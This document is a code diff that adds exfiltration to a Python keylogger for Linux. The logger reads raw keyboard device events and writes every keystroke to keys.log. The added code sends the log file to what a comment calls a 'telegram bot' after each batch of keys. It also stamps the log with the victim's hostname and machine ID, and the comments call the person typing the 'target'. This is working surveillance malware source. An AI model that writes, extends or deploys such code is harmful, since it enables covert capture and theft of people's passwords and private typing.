@@ -1,14 +1,20 @@
 #!/usr/bin/env python3
 import os
+import socket
+import uuid
 import struct
 import sys
 import time
 import threading
+from send import send
+
+wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
+debugging = 0       #get extra comments                                         (1/0)
+threshold = 10      #how many keys after sending the text to the telegram bot   (int)
 
 LOG_FILE = 'keys.log'
-wantSHIFT = 0
-debugging = 1
-
+hostname = socket.gethostname()
+machine_id = uuid.getnode()
 EVENT_FORMAT = 'llHHI'
 EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)
 
@@ -40,7 +46,6 @@ SHIFT_MAP = {
     'u': 'U', 'v': 'V', 'w': 'W', 'x': 'X', 'y': 'Y',
     'z': 'Z', ' ': ' '
 }
-
 USA_SHIFT_MAP = {
     '1': '!', '2': '"', '3': '£', '4': '$', '5': '%',
     '6': '&', '7': '/', '8': '(', '9': ')', '0': '=',
@@ -83,6 +88,19 @@ def save_o_file(c):
 flagSHIFT = 0
 shift_lock = threading.Lock()
 log_buffer = []
+contKeys = 0
+
+# SAVE KEYS
+
+def saveKey(key):
+    global contKeys
+    log_buffer.append(key)
+    save_o_file(key)
+    contKeys = contKeys + 1
+
+    if contKeys > threshold:
+        send(LOG_FILE)
+        contKeys = 0
 
 # THREAD SHIFT
 
@@ -138,9 +156,8 @@ def monitorKeys(fd):
                     if c:
                         if debugging:
                             print(f"[-] Registerd: {c}")
-                        log_buffer.append(c)
-                        save_o_file(c)
-                    if code == 1:  # ESC
+                        saveKey(c)
+                    if code == 1:
                         if debugging:
                             print("\n[!] ESC, exit.")
                         break
@@ -167,11 +184,9 @@ def main():
     if debugging:
         print(f"[+] saving keys on {LOG_FILE}")
         
-    # Apro due fd distinti sullo stesso device
     fd1 = OpenDevice(kbd_path)
     fd2 = OpenDevice(kbd_path)
 
-    # Lancio thread di monitoraggio Shift
     t_shift = threading.Thread(target=monitorShift, args=(fd1,), daemon=True)
     t_shift.start()
 
@@ -183,7 +198,6 @@ def main():
         os.close(fd1)
         os.close(fd2)
 
-    # Riepilogo
     testo = ''.join(log_buffer)
     if debugging:
         print(f"registerd about ({len(log_buffer)}) keys:")
@@ -191,4 +205,6 @@ def main():
 
 
 if __name__ == '__main__':
+    save_o_file("hostname: " + str(hostname))
+    save_o_file(", machine_id: " + str(machine_id) + "\n")
     main()
